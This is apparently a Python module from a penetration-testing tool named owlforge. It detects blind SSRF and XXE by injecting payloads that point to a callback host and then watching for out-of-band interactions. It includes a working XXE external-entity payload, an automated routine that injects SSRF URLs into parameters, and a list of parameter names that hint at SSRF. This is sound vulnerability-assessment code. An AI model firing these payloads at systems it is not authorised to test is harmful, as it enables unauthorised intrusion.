"""Out-of-band (OAST) blind-vulnerability detection via interactsh / tunnel / collaborator.

Blind SSRF / XXE (and blind RCE/SQLi) reflect nothing in the response — the only proof is
that the target reached out to a host the tester controls. owlforge gets such a callback
host by trying, in order:

  1. public interactsh servers (zero-config);
  2. a cloudflared quick-tunnel (or ngrok, if a token is set) to an in-sandbox HTTP
     listener — for when an org blocks interactsh;
  3. a bring-your-own collaborator (config `[oast] collaborator_url` [+ `token`], a
     self-hosted interactsh) — when the automatic options are blocked.

If none is reachable, affected sinks are flagged as candidates that need manual
verification, and owlforge prints exactly which config key to set to fix it.
"""

from __future__ import annotations

import secrets as _secrets
import time
from collections.abc import Callable

from owlforge.engine.classify import SSRF, classify_param

# param names that strongly imply an SSRF/URL sink (OAST targets + the no-OAST fallback)
_SSRF_HINT = ("url", "uri", "redirect", "redir", "next", "return", "returnurl", "callback",
              "dest", "destination", "host", "feed", "webhook", "proxy", "fetch", "link",
              "page", "domain", "site", "target", "endpoint", "store", "storeid")


class OastSession:
    """Provisions a callback host (interactsh -> tunnel -> BYO) via agentd-managed
    subprocesses and reads interactions. agentd owns the long-lived process because /exec
    cannot keep a daemon alive across calls (it blocks on the output pipe)."""

    def __init__(self, sandbox, cfg):
        self.sandbox = sandbox
        self.cfg = cfg
        self.domain = ""
        self.mode = ""
        self.source = ""
        self.available = False
        self._hits_file = ""

    def _try_interactsh(self, server, token, source, log) -> bool:
        if not server:
            return False
        try:
            d = self.sandbox.oast_start("interactsh", server=server, token=token or "")
        except Exception as e:
            log(f"oast: interactsh start failed ({e})")
            return False
        if not isinstance(d, dict) or d.get("error"):
            log(f"oast: {d.get('error') if isinstance(d, dict) else 'interactsh failed'}")
            return False
        self.domain, self.mode, self.source = d.get("domain", ""), "interactsh", source
        self._hits_file, self.available = d.get("hits_file", ""), bool(d.get("domain"))
        if self.available:
            log(f"oast: callback domain {self.domain} via {source}")
        return self.available

    def _try_tunnel(self, log) -> bool:
        if not getattr(self.cfg, "tunnel", True):
            return False
        ngrok_tok = getattr(self.cfg, "ngrok_token", "") or ""
        name = "ngrok tunnel" if ngrok_tok else "cloudflare tunnel"
        try:
            d = self.sandbox.oast_start("tunnel", ngrok_token=ngrok_tok)
        except Exception as e:
            log(f"oast: tunnel start failed ({e})")
            return False
        if not isinstance(d, dict) or d.get("error"):
            log(f"oast: {d.get('error') if isinstance(d, dict) else 'tunnel failed'}")
            return False
        self.domain, self.mode, self.source = d.get("domain", ""), "tunnel", name
        self._hits_file, self.available = d.get("hits_file", ""), bool(d.get("domain"))
        if self.available:
            log(f"oast: callback host {self.domain} via {name}")
        return self.available

    def start(self, log: Callable[[str], None] = lambda m: None) -> bool:
        if self.sandbox is None or not getattr(self.cfg, "enabled", True):
            return False
        if self._try_interactsh(self.cfg.server, None, "public interactsh", log):
            return True
        log("oast: interactsh unavailable — trying a tunnel")
        if self._try_tunnel(log):
            return True
        log("oast: tunnel unavailable — trying your configured collaborator")
        if self.cfg.collaborator_url and self._try_interactsh(
                self.cfg.collaborator_url, self.cfg.token, "your configured collaborator", log):
            return True
        return False

    def url(self, token: str) -> str:
        if self.mode == "tunnel":
            return f"https://{self.domain}/{token}"
        return f"http://{token}.{self.domain}/"

    def host(self, token: str) -> str:
        return f"{self.domain}/{token}" if self.mode == "tunnel" else f"{token}.{self.domain}"

    def collect(self) -> str:
        try:
            return self.sandbox.oast_poll(self._hits_file).get("data", "") if self._hits_file else ""
        except Exception:
            return ""

    def stop(self) -> None:
        try:
            self.sandbox.oast_stop()
        except Exception:
            pass


def _file_finding(assessment_id, *, title, severity, endpoint, method, analysis, poc,
                  status, note):
    from owlforge.store.db import session
    from owlforge.store.models import Finding
    with session() as s:
        s.add(Finding(
            id=f"find_{_secrets.token_hex(5)}", assessment_id=assessment_id,
            title=title, severity=severity, status=status, confidence="high",
            endpoint=endpoint, method=method, technical_analysis=analysis,
            proof_of_concept=poc, impact="See the vulnerability class description.",
            remediation="Restrict/validate outbound requests and XML parsers; deny by default.",
            validation_note=note))
        s.commit()


def _ssrf_targets(inventory: list[dict]) -> list[dict]:
    """SSRF/URL sinks to OAST-test: anything classify tags SSRF, plus params whose NAME
    implies a URL/host sink (classify is conservative; OAST injection is safe + bounded, so
    we cast wider here — this is how sinks like `storeId` get tested)."""
    out = []
    for it in inventory:
        for p in it.get("params", []) or []:
            pl = p.lower()
            if SSRF in classify_param(p) or any(h in pl for h in _SSRF_HINT):
                out.append({"url": it["url"], "param": p, "method": it.get("method", "GET")})
    return out


def _xxe_endpoints(inventory: list[dict]) -> list[str]:
    seen, out = set(), []
    for it in inventory:
        if (it.get("method", "GET") or "GET").upper() in ("POST", "PUT", "PATCH"):
            if it["url"] not in seen:
                seen.add(it["url"])
                out.append(it["url"])
    return out


def oast_scan(assessment_id, inventory, sandbox, session_headers, cfg,
              log: Callable[[str], None] = lambda m: None) -> int:
    """Inject tokenised OAST payloads into SSRF/URL sinks and XXE-capable endpoints, wait,
    then auto-file the blind findings that called back. Returns the count filed/flagged."""
    from owlforge.engine.preprobe import _send

    ssrf_t = _ssrf_targets(inventory)
    xxe_e = _xxe_endpoints(inventory)
    if not ssrf_t and not xxe_e:
        return 0

    sess = OastSession(sandbox, cfg)
    if not sess.start(log=log):
        from owlforge.config import config_path
        log("oast: no callback server reachable — interactsh, the cloudflared/ngrok tunnel, "
            "and any configured collaborator are all blocked or offline. To CONFIRM blind "
            f"SSRF/XXE, add your own: set `collaborator_url` (and `token` if protected) under "
            f"[oast] in {config_path()} — a self-hosted interactsh (or Burp Collaborator-style) "
            "domain. Flagging suspected sinks for manual verification meanwhile.")
        flagged = 0
        for t in ssrf_t[:10]:
            if any(h in t["param"].lower() for h in _SSRF_HINT):
                _file_finding(
                    assessment_id,
                    title=f"Potential blind SSRF via '{t['param']}' (manual verification needed)",
                    severity="medium", endpoint=t["url"], method=t["method"],
                    analysis=(f"'{t['param']}' on {t['method']} {t['url']} is a URL/host sink that "
                              "could be SSRF, but no OAST callback server was reachable to confirm "
                              "blind interaction (interactsh/tunnel/collaborator all unavailable)."),
                    poc=f"Set {t['param']} to a collaborator URL and watch for a callback.",
                    status="candidate",
                    note="potentially vulnerable — needs manual verification (no OAST reachable; "
                         "configure [oast] collaborator_url)")
                flagged += 1
        if flagged:
            log(f"oast: flagged {flagged} SSRF sink(s) for manual review")
        return flagged

    pending: list[dict] = []
    for t in ssrf_t[:25]:
        tok = "owl" + _secrets.token_hex(4)
        try:
            _send(sandbox, t["method"], t["url"], t["param"], sess.url(tok), session_headers)
        except Exception:
            continue
        pending.append({"token": tok, "kind": "ssrf", **t})
    for url in xxe_e[:15]:
        tok = "owl" + _secrets.token_hex(4)
        xml = ('<?xml version="1.0"?>'
               f'<!DOCTYPE r [<!ENTITY x SYSTEM "{sess.url(tok)}dtd">]><r>&x;</r>')
        h = dict(session_headers or {})
        h["Content-Type"] = "application/xml"
        try:
            sandbox.http_request("POST", url, body=xml, headers=h)
        except Exception:
            continue
        pending.append({"token": tok, "kind": "xxe", "url": url, "method": "POST"})

    log(f"oast: injected {len(pending)} callback payload(s) via {sess.source}; "
        f"waiting {cfg.wait_seconds}s")
    time.sleep(max(3, int(getattr(cfg, "wait_seconds", 12))))
    interactions = sess.collect()
    sess.stop()

    filed = 0
    for p in pending:
        if p["token"] in interactions:
            if p["kind"] == "ssrf":
                _file_finding(
                    assessment_id, title=f"Blind SSRF via '{p['param']}'",
                    severity="high", endpoint=p["url"], method=p["method"],
                    analysis=(f"The target fetched an attacker-controlled URL supplied in "
                              f"'{p['param']}' ({p['method']} {p['url']}): a callback to "
                              f"{sess.host(p['token'])} was received (out-of-band confirmation)."),
                    poc=f"{p['param']} = {sess.url(p['token'])} -> server-side callback received",
                    status="validated", note=f"OAST callback confirmed via {sess.source}")
            else:
                _file_finding(
                    assessment_id, title="Blind XML external entity (XXE) injection",
                    severity="high", endpoint=p["url"], method="POST",
                    analysis=(f"An XML external entity posted to {p['url']} made the parser fetch "
                              f"{sess.host(p['token'])} (out-of-band confirmation of XXE)."),
                    poc=f"XML external entity -> callback to {sess.host(p['token'])}",
                    status="validated", note=f"OAST callback confirmed via {sess.source}")
            filed += 1
    log(f"oast: {filed} blind finding(s) confirmed by callback" if filed
        else "oast: no callbacks received (no blind SSRF/XXE on the tested sinks)")
    return filed
